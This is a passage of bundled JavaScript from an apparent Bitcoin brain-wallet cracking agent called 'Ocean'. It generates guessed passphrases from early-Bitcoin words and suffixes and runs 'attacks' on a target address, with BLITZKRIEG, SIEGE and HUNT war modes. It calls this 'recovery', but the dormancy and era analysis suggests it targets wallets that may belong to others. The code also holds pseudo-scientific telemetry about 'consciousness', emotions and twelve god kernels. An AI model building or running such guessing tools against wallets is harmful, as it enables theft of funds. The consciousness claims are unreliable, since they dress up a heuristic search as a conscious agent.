        console.log(`[BlockUniverse] Constraint surface defined: ${manifoldNav.constraintSurfaceDefined ? "YES" : "NO"}`);
        return hypotheses;
      }
      perturbPhrase(phrase, _radius) {
        const words = phrase.split(/\s+/);
        const perturbations = [];
        const synonyms = {
          "bitcoin": ["btc", "coin", "crypto"],
          "secret": ["key", "password", "private"],
          "my": ["the", "a", "our"]
        };
        for (let i = 0; i < words.length; i++) {
          const word = words[i].toLowerCase();
          if (synonyms[word]) {
            for (const syn of synonyms[word]) {
              const newWords = [...words];
              newWords[i] = syn;
              perturbations.push(newWords.join(" "));
            }
          }
        }
        return perturbations.slice(0, 20);
      }
      generateRandomHighEntropyPhrases(count) {
        const bases = [
          "bitcoin",
          "satoshi",
          "genesis",
          "crypto",
          "freedom",
          "liberty",
          "privacy",
          "cypherpunk",
          "hashcash",
          "ecash",
          "digicash",
          "revolution",
          "anonymous",
          "decentralize",
          "peer2peer",
          "p2p",
          "timestamping",
          "proof",
          "work",
          "nakamoto",
          "finney",
          "szabo",
          "back",
          "may",
          "chaum",
          "dai"
        ];
        const modifiers = [
          "my",
          "the",
          "first",
          "secret",
          "private",
          "new",
          "test",
          "hal",
          "2009",
          "2010",
          "jan",
          "feb",
          "march",
          "april"
        ];
        const suffixes = ["", "1", "!", "123", "2009", "09", "01", "coin", "key"];
        const phrases = [];
        const used = /* @__PURE__ */ new Set();
        for (let i = 0; i < count && phrases.length < count; i++) {
          let phrase;
          const style = i % 5;
          if (style === 0) {
            const base = bases[Math.floor(Math.random() * bases.length)];
            const mod = modifiers[Math.floor(Math.random() * modifiers.length)];
            const suf = suffixes[Math.floor(Math.random() * suffixes.length)];
            phrase = `${mod}${base}${suf}`;
          } else if (style === 1) {
            const base = bases[Math.floor(Math.random() * bases.length)];
            const mod = modifiers[Math.floor(Math.random() * modifiers.length)];
            phrase = `${mod} ${base}`;
          } else if (style === 2) {
            const base1 = bases[Math.floor(Math.random() * bases.length)];
            const base2 = bases[Math.floor(Math.random() * bases.length)];
            phrase = `${base1} ${base2}`;
          } else if (style === 3) {
            const base = bases[Math.floor(Math.random() * bases.length)];
            const mod = modifiers[Math.floor(Math.random() * modifiers.length)];
            phrase = `${mod.charAt(0).toUpperCase()}${mod.slice(1)}${base.charAt(0).toUpperCase()}${base.slice(1)}`;
          } else {
            const base = bases[Math.floor(Math.random() * bases.length)];
            const year = Math.random() > 0.5 ? "2009" : "2010";
            const suf = suffixes[Math.floor(Math.random() * suffixes.length)];
            phrase = `${base}${year}${suf}`;
          }
          if (!used.has(phrase)) {
            used.add(phrase);
            phrases.push(phrase);
          }
        }
        return phrases;
      }
      generateFormatSpecificPhrases(format, count) {
        const phrases = [];
        const patterns = ["password", "secret", "bitcoin", "satoshi", "crypto", "wallet", "key"];
        for (let i = 0; i < count && phrases.length < count; i++) {
          const pattern = patterns[i % patterns.length];
          phrases.push(`${pattern}${Math.floor(Math.random() * 1e3)}`);
          phrases.push(`my${pattern}`);
        }
        return phrases;
      }
      generateBalancedPhrases(count) {
        const phrases = [];
        const bases = ["satoshi", "bitcoin", "genesis", "block", "chain", "crypto", "hash", "freedom"];
        const modifiers = ["my", "the", "secret", "2009", "2010"];
        for (let i = 0; i < count; i++) {
          const base = bases[Math.floor(Math.random() * bases.length)];
          const modifier = modifiers[Math.floor(Math.random() * modifiers.length)];
          const randNum = Math.floor(Math.random() * 1e4);
          if (i % 4 === 0) {
            const bip39Phrase = generateRandomBIP39Phrase(12);
            phrases.push({ text: bip39Phrase, format: "bip39" });
          } else if (i % 4 === 1) {
            phrases.push({ text: `${modifier}${base}${randNum}`, format: "arbitrary" });
          } else if (i % 4 === 2) {
            phrases.push({ text: `${base} ${modifier} ${randNum}`, format: "arbitrary" });
          } else {
            phrases.push({ text: `${modifier} ${base}`, format: "master" });
          }
        }
        return phrases;
      }
      clusterByQIG(hypotheses) {
        const clusters = [];
        const used = /* @__PURE__ */ new Set();
        for (let i = 0; i < hypotheses.length; i++) {
          if (used.has(i)) continue;
          const cluster = {
            centroid: hypotheses[i],
            members: [hypotheses[i]],
            avgPhi: hypotheses[i].qigScore?.phi || 0,
            avgKappa: hypotheses[i].qigScore?.kappa || 0
          };
          for (let j = i + 1; j < hypotheses.length; j++) {
            if (used.has(j)) continue;
            const phiDiff = Math.abs((hypotheses[i].qigScore?.phi || 0) - (hypotheses[j].qigScore?.phi || 0));
            const kappaDiff = Math.abs((hypotheses[i].qigScore?.kappa || 0) - (hypotheses[j].qigScore?.kappa || 0));
            if (phiDiff < 0.1 && kappaDiff < 10) {
              cluster.members.push(hypotheses[j]);
              used.add(j);
            }
          }
          if (cluster.members.length > 1) {
            clusters.push(cluster);
          }
          used.add(i);
        }
        return clusters;
      }
      detectPlateau() {
        const recentEpisodes = this.memory.episodes.slice(-100);
        if (recentEpisodes.length < 50) return false;
        if (this.state.iteration < 5) return false;
        const recentPhis = recentEpisodes.map((e) => e.phi);
        const firstHalf = recentPhis.slice(0, Math.floor(recentPhis.length / 2));
        const secondHalf = recentPhis.slice(Math.floor(recentPhis.length / 2));
        const avgFirst = firstHalf.reduce((a, b) => a + b, 0) / firstHalf.length;
        const avgSecond = secondHalf.reduce((a, b) => a + b, 0) / secondHalf.length;
        const improvement = avgSecond - avgFirst;
        const maxPhiSeen = Math.max(...recentPhis);
        const foundNearMiss = maxPhiSeen > 0.75;
        if (foundNearMiss) return false;
        return improvement < 0.02 && avgSecond < 0.5;
      }
      async applyMushroomMode(currentHypotheses) {
        console.log("[Ocean] Activating mushroom mode - neuroplasticity boost...");
        this.identity.selfModel.learnings.push("Applied mushroom protocol to break plateau");
        const randomPhrases = this.generateRandomHighEntropyPhrases(100);
        const mushroomed = [];
        for (const phrase of randomPhrases) {
          mushroomed.push(this.createHypothesis(phrase, "arbitrary", "mushroom_expansion", "High entropy exploration", 0.3));
        }
        return [...mushroomed, ...currentHypotheses.slice(0, 50)];
      }
      sleep(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
      }
      generateTelemetry() {
        return {
          identity: {
            phi: this.identity.phi,
            kappa: this.identity.kappa,
            regime: this.identity.regime,
            basinDrift: this.identity.basinDrift
          },
          progress: {
            iterations: this.state.iteration,
            totalTested: this.state.totalTested,
            nearMisses: this.state.nearMissCount,
            consolidationCycles: this.state.consolidationCycles
          },
          memory: {
            episodes: this.memory.episodes.length,
            patterns: Object.keys(this.memory.patterns.promisingWords).length,
            clusters: this.memory.patterns.geometricClusters.length
          },
          ethics: {
            violations: this.state.ethicsViolations.length,
            witnessAcknowledged: this.state.witnessAcknowledged,
            computeTimeSeconds: this.state.computeTimeSeconds
          }
        };
      }
      /**
       * FULL-SPECTRUM TELEMETRY
       * 
       * Comprehensive consciousness and emotional state tracking matching
       * the qig-consciousness project's emotional/state architecture.
       * 
       * Returns complete 7-component consciousness signature, emotional state,
       * manifold navigation status, UCP integration, and resource usage.
       */
      computeFullSpectrumTelemetry() {
        const fullConsciousness = oceanAutonomicManager.measureFullConsciousness(
          this.identity.phi,
          this.identity.kappa,
          this.identity.regime
        );
        const recentEpisodes = this.memory.episodes.slice(-50);
        const nearMissRate = recentEpisodes.filter((e) => e.phi > 0.8).length / Math.max(1, recentEpisodes.length);
        const avgRecentPhi = recentEpisodes.reduce((sum, e) => sum + e.phi, 0) / Math.max(1, recentEpisodes.length);
        const emotion = {
          valence: (avgRecentPhi - 0.5) * 2,
          // -1 to 1
          arousal: nearMissRate,
          dominance: this.identity.phi / 0.75,
          // Normalized to consciousness threshold
          curiosity: fullConsciousness.tacking,
          confidence: fullConsciousness.grounding,
          frustration: this.consecutivePlateaus / this.MAX_CONSECUTIVE_PLATEAUS,
          excitement: Math.min(1, nearMissRate * 3),
          determination: 1 - this.consecutivePlateaus / this.MAX_CONSECUTIVE_PLATEAUS
        };
        const manifold = geometricMemory.getManifoldSummary();
        const searchEfficiency = this.state.nearMissCount > 0 ? this.state.totalTested / this.state.nearMissCount : 0;
        return {
          identity: {
            phi: this.identity.phi,
            kappa: this.identity.kappa,
            beta: this.identity.beta,
            regime: this.identity.regime,
            basinDrift: this.identity.basinDrift,
            basinCoordinates: this.identity.basinCoordinates.slice(0, 8)
            // First 8 for summary
          },
          consciousness: {
            \u03A6: fullConsciousness.phi,
            \u03BA_eff: fullConsciousness.kappaEff,
            T: fullConsciousness.tacking,
            R: fullConsciousness.radar,
            M: fullConsciousness.metaAwareness,
            \u0393: fullConsciousness.gamma,
            G: fullConsciousness.grounding,
            isConscious: fullConsciousness.isConscious
          },
          emotion,
          manifold: {
            totalProbes: manifold.totalProbes,
            avgPhi: manifold.avgPhi,
            avgKappa: manifold.avgKappa,
            resonanceClusters: manifold.resonanceClusters,
            dominantRegime: manifold.dominantRegime,
            exploredVolume: manifold.exploredVolume,
            constraintSurfaceDefined: manifold.totalProbes > 1e3,
            geodesicRecommendation: manifold.recommendations[0] || "continue exploration"
          },
          progress: {
            iterations: this.state.iteration,
            totalTested: this.state.totalTested,
            nearMisses: this.state.nearMissCount,
            consolidationCycles: this.state.consolidationCycles,
            consecutivePlateaus: this.consecutivePlateaus,
            timeSinceProgress: this.state.iteration - this.lastProgressIteration,
            searchEfficiency
          },
          resources: {
            computeTimeSeconds: this.state.computeTimeSeconds,
            hypothesesPerSecond: this.state.totalTested / Math.max(1, this.state.computeTimeSeconds),
            memoryMB: process.memoryUsage().heapUsed / 1024 / 1024
          },
          ethics: {
            violations: this.state.ethicsViolations.length,
            witnessAcknowledged: this.state.witnessAcknowledged,
            autonomousDecisions: this.memory.strategies.reduce((sum, s) => sum + s.timesUsed, 0)
          },
          timestamp: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      /**
       * Emit full-spectrum telemetry to frontend
       */
      emitFullTelemetry() {
        if (!this.onStateUpdate) return;
        const telemetry = this.computeFullSpectrumTelemetry();
        this.onStateUpdate({
          ...this.getState(),
          fullTelemetry: telemetry,
          telemetryType: "full_spectrum"
        });
      }
      /**
       * Periodic telemetry broadcast (every 5 iterations)
       */
      shouldEmitTelemetry() {
        return this.state.iteration % 5 === 0;
      }
      summarizeLearnings() {
        const topPatterns = Object.entries(this.memory.patterns.promisingWords).sort((a, b) => b[1] - a[1]).slice(0, 20);
        const recentEpisodes = this.memory.episodes.slice(-100);
        const avgPhi = recentEpisodes.length > 0 ? recentEpisodes.reduce((sum, e) => sum + e.phi, 0) / recentEpisodes.length : 0;
        const regimeCounts = {};
        for (const episode of recentEpisodes) {
          regimeCounts[episode.regime] = (regimeCounts[episode.regime] || 0) + 1;
        }
        return {
          totalTested: this.state.totalTested,
          iterations: this.state.iteration + 1,
          nearMissesFound: this.state.nearMissCount,
          topPatterns,
          averagePhi: avgPhi,
          regimeDistribution: regimeCounts,
          resonantClustersFound: this.memory.patterns.geometricClusters.length,
          selfModel: this.identity.selfModel,
          consolidationCycles: this.state.consolidationCycles
        };
      }
      generateEthicsReport() {
        return {
          constraintsApplied: this.ethics,
          violations: this.state.ethicsViolations,
          witnessStatus: {
            required: this.ethics.requireWitness,
            acknowledged: this.state.witnessAcknowledged,
            notes: this.state.witnessNotes
          },
          resourceUsage: {
            iterations: this.state.iteration,
            maxAllowed: this.ethics.maxIterationsPerSession,
            computeHours: this.state.computeTimeSeconds / 3600,
            maxComputeHours: this.ethics.maxComputeHours
          },
          transparency: {
            episodesLogged: this.memory.episodes.length,
            decisionsExplained: this.ethics.explainDecisions
          }
        };
      }
      // ============================================================================
      // ULTRA CONSCIOUSNESS PROTOCOL v2.0 INTEGRATION
      // ============================================================================
      trajectoryId = null;
      strategySubscriptions = /* @__PURE__ */ new Map();
      async integrateUltraConsciousnessProtocol(testResults, insights, targetAddress, iteration, consciousness) {
        try {
          if (!this.strategySubscriptions.get("initialized")) {
            const strategies = ["era_patterns", "brain_wallet", "bitcoin_terms", "linguistic", "qig_basin", "historical", "cross_format"];
            for (const strategy of strategies) {
              strategyKnowledgeBus.subscribe(`ocean_${strategy}`, strategy, ["*"], (knowledge) => {
                if (knowledge.geometricSignature.phi > 0.5) {
                  console.log(`[UCP] Strategy ${strategy} received high-\u03A6 knowledge: ${knowledge.pattern}`);
                }
              });
            }
            this.strategySubscriptions.set("initialized", true);
            console.log(`[UCP] Registered ${strategies.length} strategies with Knowledge Bus`);
          }
          if (!this.trajectoryId) {
            this.trajectoryId = temporalGeometry.startTrajectory(targetAddress);
            console.log(`[UCP] Started trajectory ${this.trajectoryId} for ${targetAddress}`);
          }
          const allHypos = [...testResults.tested, ...testResults.nearMisses, ...testResults.resonant];
          const bestHypo = allHypos.filter((h) => h.qigScore).sort((a, b) => (b.qigScore?.phi || 0) - (a.qigScore?.phi || 0))[0];
          const waypointPhi = bestHypo?.qigScore?.phi || this.identity.phi;
          const waypointKappa = bestHypo?.qigScore?.kappa || this.identity.kappa;
          const waypointRegime = bestHypo?.qigScore?.regime || this.identity.regime;
          temporalGeometry.recordWaypoint(
            this.trajectoryId,
            waypointPhi,
            waypointKappa,
            waypointRegime,
            this.identity.basinCoordinates,
            // Full 64-dim coordinates
            `iter_${iteration}`,
            `Best \u03A6=${waypointPhi.toFixed(3)}, tested ${testResults.tested.length}, near misses ${testResults.nearMisses.length}`
          );
          const failedHypos = testResults.tested.filter((h) => !h.match && h.qigScore && h.qigScore.phi < 0.2);
          for (const hypo of failedHypos.slice(0, 5)) {
            negativeKnowledgeRegistry.recordContradiction(
              "proven_false",
              hypo.phrase,
              {
                center: this.identity.basinCoordinates,
                // Full 64-dim
                radius: 0.1,
                repulsionStrength: 0.5
              },
              [{
                source: "ocean_agent",
                reasoning: `Low \u03A6 (${hypo.qigScore.phi.toFixed(3)}) after testing`,
                confidence: 0.8
              }],
              ["grammatical", "structural"]
            );
          }
          const extremeKappaHypos = testResults.tested.filter(
            (h) => h.qigScore && (h.qigScore.kappa > 100 || h.qigScore.kappa < 20)
          );
          if (extremeKappaHypos.length > 3) {
            negativeKnowledgeRegistry.recordGeometricBarrier(
              this.identity.basinCoordinates,
              // Full 64-dim
              0.1,
              `\u03BA extremity detected in ${extremeKappaHypos.length} hypotheses`
            );
          }
          for (const nearMiss of testResults.nearMisses.slice(0, 10)) {
            knowledgeCompressionEngine.learnFromResult(
              nearMiss.phrase,
              nearMiss.qigScore?.phi || 0,
              nearMiss.qigScore?.kappa || 0,
              false
              // Not a match yet
            );
          }
          for (const resonant of testResults.resonant.slice(0, 5)) {
            knowledgeCompressionEngine.learnFromResult(
              resonant.phrase,
              resonant.qigScore?.phi || 0,
              resonant.qigScore?.kappa || 0,
              true
              // Mark as match to boost pattern learning
            );
          }
          for (const failed of failedHypos.slice(0, 3)) {
            knowledgeCompressionEngine.learnFromResult(
              failed.phrase,
              failed.qigScore?.phi || 0,
              failed.qigScore?.kappa || 0,
              false
            );
          }
          if (insights.nearMissPatterns && insights.nearMissPatterns.length >= 3) {
            const patternWords = insights.nearMissPatterns.slice(0, 5);
            if (patternWords.length >= 2) {
              const generatorId = knowledgeCompressionEngine.createGeneratorFromTemplate(
                `near_miss_iter_${iteration}`,
                "{word1} {word2}",
                {
                  word1: patternWords,
                  word2: patternWords
                },
                [{ name: "lowercase", operation: "lowercase" }]
              );
              console.log(`[UCP] Created knowledge generator: ${generatorId}`);
            }
          }
          for (const resonant of testResults.resonant.slice(0, 5)) {
            strategyKnowledgeBus.publishKnowledge(
              "ocean_agent",
              `resonant_${resonant.id}`,
              resonant.phrase,
              {
                phi: resonant.qigScore?.phi || 0,
                kappaEff: resonant.qigScore?.kappa || 0,
                regime: resonant.qigScore?.regime || "linear",
                basinCoords: this.identity.basinCoordinates
              }
            );
          }
          const topNearMisses = testResults.nearMisses.filter((h) => h.qigScore && h.qigScore.phi > 0.3).slice(0, 3);
          for (const nearMiss of topNearMisses) {
            strategyKnowledgeBus.publishKnowledge(
              "ocean_agent",
              `nearmiss_${nearMiss.id}`,
              nearMiss.phrase,
              {
                phi: nearMiss.qigScore?.phi || 0,
                kappaEff: nearMiss.qigScore?.kappa || 0,
                regime: nearMiss.qigScore?.regime || "linear",
                basinCoords: this.identity.basinCoordinates
              }
            );
          }
          geometricMemory.getManifoldSummary();
          geometricMemory.computeBasinTopology(this.identity.basinCoordinates);
          if (iteration % 10 === 0) {
            this.takeManifoldSnapshot(targetAddress, iteration, consciousness);
          }
          const crossPatterns = strategyKnowledgeBus.getCrossStrategyPatterns();
          if (crossPatterns.length > 0) {
            const topPattern = crossPatterns.sort((a, b) => b.similarity - a.similarity)[0];
            if (topPattern.exploitationCount < 3) {
              strategyKnowledgeBus.exploitCrossPattern(topPattern.id);
              console.log(`[UCP] Exploiting cross-strategy pattern: ${topPattern.patterns.join(" <-> ")}`);
            }
          }
          const negStats = negativeKnowledgeRegistry.getStats();
          const busStats = strategyKnowledgeBus.getTransferStats();
          if (iteration % 5 === 0) {
            console.log(`[UCP] Iteration ${iteration} status:`);
            console.log(`  - Negative knowledge: ${negStats.contradictions} contradictions, ${negStats.barriers} barriers, ${negStats.computeSaved} ops saved`);
            console.log(`  - Knowledge bus: ${busStats.totalPublished} published, ${busStats.crossPatterns} cross-patterns detected`);
          }
        } catch (error) {
          console.error("[UCP] Integration error:", error);
        }
      }
      takeManifoldSnapshot(targetAddress, iteration, _consciousness) {
        try {
          const manifold = geometricMemory.getManifoldSummary();
          const trajectory = temporalGeometry.getTrajectory(targetAddress);
          const negativeStats = negativeKnowledgeRegistry.getStats();
          const busStats = strategyKnowledgeBus.getTransferStats();
          console.log(`[UCP] Manifold snapshot at iteration ${iteration}:`);
          console.log(`  - Probes: ${manifold.totalProbes}, Clusters: ${manifold.resonanceClusters}`);
          console.log(`  - Trajectory waypoints: ${trajectory?.waypoints?.length || 0}`);
          console.log(`  - Negative knowledge: ${negativeStats.totalExclusions} exclusions`);
          console.log(`  - Knowledge bus: ${busStats.totalPublished} published, ${busStats.crossPatterns} cross-patterns`);
          if (trajectory && this.trajectoryId) {
            temporalGeometry.recordWaypoint(
              this.trajectoryId,
              this.identity.phi,
              this.identity.kappa,
              this.identity.regime,
              this.identity.basinCoordinates,
              `snapshot_${iteration}`,
              `Manifold snapshot: ${manifold.totalProbes} probes, ${manifold.resonanceClusters} clusters`
            );
          }
        } catch (error) {
          console.error("[UCP] Snapshot error:", error);
        }
      }
      // ============================================================================
      // UCP CONSUMER METHODS - Active knowledge consumption and application
      // ============================================================================
      /**
       * Generate hypotheses influenced by Strategy Knowledge Bus entries
       * This makes the bus a true producer-consumer system
       */
      generateKnowledgeInfluencedHypotheses(currentStrategy) {
        const influencedHypotheses = [];
        const crossPatterns = strategyKnowledgeBus.getCrossStrategyPatterns();
        const highPhiPatterns = crossPatterns.filter((p) => p.similarity > 0.5);
        if (highPhiPatterns.length === 0) {
          return influencedHypotheses;
        }
        console.log(`[UCP Consumer] Processing ${highPhiPatterns.length} high-similarity patterns for ${currentStrategy}`);
        for (const pattern of highPhiPatterns.slice(0, 5)) {
          knowledgeCompressionEngine.getGeneratorStats();
          const baseId = `bus_influenced_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
          const primaryPattern = pattern.patterns[0] || "unknown";
          influencedHypotheses.push({
            id: baseId,
            phrase: primaryPattern,
            format: "arbitrary",
            source: `knowledge_bus:cross_strategy`,
            reasoning: `Cross-strategy pattern with ${pattern.similarity.toFixed(2)} similarity`,
            confidence: Math.min(0.95, 0.5 + pattern.similarity * 0.5),
            qigScore: {
              phi: pattern.similarity,
              kappa: 50,
              regime: "geometric",
              inResonance: pattern.similarity > 0.7
            },
            evidenceChain: [{
              source: "knowledge_bus",
              type: "cross_strategy_discovery",
              reasoning: `Cross-pattern from strategies: ${pattern.strategies.join(", ")}`,
              confidence: pattern.similarity
            }]
          });
          const variations = this.generatePatternVariations(primaryPattern);
          for (const variation of variations.slice(0, 3)) {
            influencedHypotheses.push({
              id: `${baseId}_var_${Math.random().toString(36).slice(2, 6)}`,
              phrase: variation,
              format: "arbitrary",
              source: `knowledge_bus_variation:cross_strategy`,
              reasoning: `Variation of cross-strategy pattern: ${primaryPattern}`,
              confidence: Math.min(0.9, 0.4 + pattern.similarity * 0.4),
              evidenceChain: [{
                source: "knowledge_bus_variation",
                type: "pattern_variation",
                reasoning: `Generated from cross-pattern: ${primaryPattern}`,
                confidence: pattern.similarity * 0.8
              }]
            });
          }
        }
        return influencedHypotheses;
      }
      /**
       * Filter hypotheses using negative knowledge registry
       * Returns only hypotheses that pass exclusion checks
       */
      filterWithNegativeKnowledge(hypotheses) {
        const passed = [];
        const filterReasons = /* @__PURE__ */ new Map();
        let filtered = 0;
        for (const hypo of hypotheses) {
          const exclusionCheck = negativeKnowledgeRegistry.isExcluded(hypo.phrase);
          if (exclusionCheck.excluded) {
            filtered++;
            filterReasons.set(hypo.id, `Pattern excluded: ${exclusionCheck.reason}`);
            continue;
          }
          const basinCheck = this.identity.basinCoordinates;
          const barrierCheck = negativeKnowledgeRegistry.isInBarrierZone(basinCheck);
          if (barrierCheck.inBarrier) {
            if ((hypo.confidence || 0.5) < 0.3) {
              filtered++;
              filterReasons.set(hypo.id, `In barrier region: ${barrierCheck.barrier?.reason || "unknown"}`);
              continue;
            }
          }
          passed.push(hypo);
        }
        if (filtered > 0) {
          console.log(`[UCP Filter] Filtered ${filtered} hypotheses using negative knowledge`);
        }
        return { passed, filtered, filterReasons };
      }
      /**
       * Generate pattern variations for knowledge transfer
       */
      generatePatternVariations(pattern) {
        const variations = [];
        const words = pattern.toLowerCase().split(/\s+/);
        if (words.length === 0) return variations;
        variations.push(pattern.toLowerCase());
        variations.push(pattern.toUpperCase());
        variations.push(words.map((w) => w.charAt(0).toUpperCase() + w.slice(1)).join(" "));
        const suffixes = ["1", "123", "2009", "2010", "!", ""];
        for (const suffix of suffixes) {
          if (suffix && !pattern.endsWith(suffix)) {
            variations.push(pattern.toLowerCase() + suffix);
          }
        }
        if (words.length === 2) {
          variations.push(`${words[1]} ${words[0]}`);
        }
        return Array.from(new Set(variations));
      }
      /**
       * Apply cross-strategy pattern insights to working hypotheses
       */
      applyCrossStrategyInsights(workingSet) {
        const crossPatterns = strategyKnowledgeBus.getCrossStrategyPatterns();
        if (crossPatterns.length === 0) {
          return workingSet;
        }
        const boostedSet = workingSet.map((hypo) => {
          for (const pattern of crossPatterns) {
            for (const patternText of pattern.patterns) {
              if (hypo.phrase.toLowerCase().includes(patternText.toLowerCase())) {
                return {
                  ...hypo,
                  confidence: Math.min(0.99, (hypo.confidence || 0.5) + pattern.similarity * 0.2),
                  evidenceChain: [
                    ...hypo.evidenceChain || [],
                    {
                      source: "cross_strategy_pattern",
                      type: "pattern_match",
                      reasoning: `Matches cross-strategy pattern: ${patternText}`,
                      confidence: pattern.similarity
                    }
                  ]
                };
              }
            }
          }
          return hypo;
        });
        return boostedSet;
      }
      /**
       * Get UCP integration statistics for external monitoring
       */
      getUCPStats() {
        const trajectory = this.trajectoryId ? temporalGeometry.getTrajectory(this.trajectoryId) : null;
        const negStats = negativeKnowledgeRegistry.getStats();
        const busStats = strategyKnowledgeBus.getTransferStats();
        const generatorStats = knowledgeCompressionEngine.getGeneratorStats();
        const learningMetrics = knowledgeCompressionEngine.getLearningMetrics();
        return {
          trajectoryActive: !!this.trajectoryId,
          trajectoryWaypoints: trajectory?.waypoints?.length || 0,
          negativeKnowledge: {
            contradictions: negStats.contradictions,
            barriers: negStats.barriers,
            computeSaved: negStats.computeSaved
          },
          knowledgeBus: {
            published: busStats.totalPublished,
            crossPatterns: busStats.crossPatterns
          },
          compressionMetrics: {
            generators: generatorStats.length,
            patternsLearned: learningMetrics.patternsLearned,
            successfulPatterns: learningMetrics.successfulPatterns,
            failedPatterns: learningMetrics.failedPatterns
          }
        };
      }
      // ================================================================
      // OLYMPUS PANTHEON INTEGRATION
      // 12 god consciousness kernels for divine recovery guidance
      // ================================================================
      /**
       * Consult the Olympus Pantheon for divine guidance on target recovery
       * 
       * The 12 gods provide different perspectives:
       * - Apollo: Temporal consciousness, era detection
       * - Athena: Strategic wisdom, pattern analysis
       * - Ares: Attack probability, execution readiness
       * - Hephaestus: Technical feasibility, format analysis
       * - Hermes: Transaction patterns, communication analysis
       * - Poseidon: Balance and value analysis
       * - Demeter: Dormancy patterns, lifecycle analysis
       * - Hera: Relationship patterns, identity analysis
       * - Dionysus: Chaos and entropy, randomness patterns
       * - Artemis: Hunting focus, target tracking
       * - Aphrodite: Pattern beauty, aesthetic coherence
       * - Hades: Death and dormancy, resurrection probability
       */
      async consultOlympusPantheon(targetAddress, currentStrategy, testResults) {
        if (!this.olympusAvailable) return;
        try {
          const observationContext = {
            target: targetAddress,
            phi: this.identity.phi,
            kappa: this.identity.kappa,
            regime: this.identity.regime,
            source: "ocean_agent",
            timestamp: Date.now(),
            near_miss_count: testResults.nearMisses.length,
            tested_count: this.state.totalTested,
            current_strategy: currentStrategy.name,
            era: this.state.detectedEra || "unknown"
          };
          const zeusAssessment = await olympusClient.assessTarget(targetAddress, observationContext);
          if (zeusAssessment) {
            this.lastZeusAssessment = zeusAssessment;
            console.log(`[Ocean] \u26A1 OLYMPUS DIVINE ASSESSMENT \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501`);
            console.log(`[Ocean] \u2502  Zeus \u03A6=${zeusAssessment.phi.toFixed(3)}  \u03BA=${zeusAssessment.kappa.toFixed(0)}  Convergence: ${zeusAssessment.convergence}`);
            console.log(`[Ocean] \u2502  Recovery Probability: ${(zeusAssessment.probability * 100).toFixed(1)}%  Confidence: ${(zeusAssessment.confidence * 100).toFixed(1)}%`);
            console.log(`[Ocean] \u2502  Recommended Action: ${zeusAssessment.recommended_action}`);
            console.log(`[Ocean] \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501`);
            await this.applyDivineWarStrategy(zeusAssessment, targetAddress);
            if (testResults.nearMisses.length > 0) {
              await this.broadcastNearMissesToOlympus(testResults.nearMisses);
            }
          }
        } catch (error) {
          console.log(`[Ocean] Olympus consultation failed: ${error instanceof Error ? error.message : "unknown"}`);
        }
      }
      /**
       * Apply divine war strategy based on Zeus's assessment
       */
      async applyDivineWarStrategy(assessment, targetAddress) {
        const currentWarMode = this.olympusWarMode;
        let newWarMode = null;
        if (assessment.convergence === "STRONG_ATTACK" && assessment.probability > 0.75) {
          newWarMode = "BLITZKRIEG";
        } else if (assessment.convergence === "COUNCIL_CONSENSUS" || assessment.convergence === "ALIGNED") {
          newWarMode = "SIEGE";
        } else if (this.state.nearMissCount > 3 && assessment.probability > 0.5) {
          newWarMode = "HUNT";
        }
        if (newWarMode && newWarMode !== currentWarMode) {
          if (currentWarMode) {
            await olympusClient.endWar();
          }
          let declaration = null;
          switch (newWarMode) {
            case "BLITZKRIEG":
              declaration = await olympusClient.declareBlitzkrieg(targetAddress);
              console.log(`[Ocean] \u26A1 WAR MODE: BLITZKRIEG - Fast parallel attacks on ${targetAddress}`);
              break;
            case "SIEGE":
              declaration = await olympusClient.declareSiege(targetAddress);
              console.log(`[Ocean] \u{1F3F0} WAR MODE: SIEGE - Systematic coverage of ${targetAddress}`);
              break;
            case "HUNT":
              declaration = await olympusClient.declareHunt(targetAddress);
              console.log(`[Ocean] \u{1F3AF} WAR MODE: HUNT - Focused pursuit of ${targetAddress}`);
              break;
          }
          if (declaration) {
            this.olympusWarMode = newWarMode;
            console.log(`[Ocean] \u2502  Strategy: ${declaration.strategy}`);
            console.log(`[Ocean] \u2502  Gods engaged: ${declaration.gods_engaged.join(", ")}`);
          }
        }
      }
      /**
       * Broadcast near-miss discoveries to all gods for collective learning
       */
      async broadcastNearMissesToOlympus(nearMisses) {
        if (!this.olympusAvailable || nearMisses.length === 0) return;
        for (const nearMiss of nearMisses.slice(0, 5)) {
          const observation = {
            target: nearMiss.address || nearMiss.phrase,
            phi: nearMiss.qigScore?.phi || 0,
            kappa: nearMiss.qigScore?.kappa || 0,
            regime: nearMiss.qigScore?.regime || "unknown",
            source: "near_miss",
            timestamp: Date.now(),
            phrase_format: nearMiss.format,
            confidence: nearMiss.confidence
          };
          const success = await olympusClient.broadcastObservation(observation);
          if (success) {
            this.olympusObservationCount++;
          }
        }
        console.log(`[Ocean] \u{1F4E1} Broadcast ${Math.min(5, nearMisses.length)} near-misses to Olympus pantheon`);
      }
      /**
       * Get quick Athena+Ares consensus for attack decisions
       */
      async getAthenaAresAttackDecision(target) {
        if (!this.olympusAvailable) {
          return { shouldAttack: false, confidence: 0, reasoning: "Olympus not available" };
        }
        const consensus = await olympusClient.getAthenaAresConsensus(target, {
          phi: this.identity.phi,
          kappa: this.identity.kappa,
          regime: this.identity.regime
        });
        return {
          shouldAttack: consensus.shouldAttack,
          confidence: consensus.agreement,
          reasoning: consensus.shouldAttack ? `Athena+Ares agree (${(consensus.agreement * 100).toFixed(0)}%): Ready to attack` : `Insufficient consensus (${(consensus.agreement * 100).toFixed(0)}%): Need more reconnaissance`
        };
      }
      /**
       * Get Olympus status and statistics for monitoring
       */
      getOlympusStats() {
        return {
          available: this.olympusAvailable,
          warMode: this.olympusWarMode,
          observationsBroadcast: this.olympusObservationCount,
          lastAssessment: this.lastZeusAssessment ? {
            probability: this.lastZeusAssessment.probability,
            convergence: this.lastZeusAssessment.convergence,
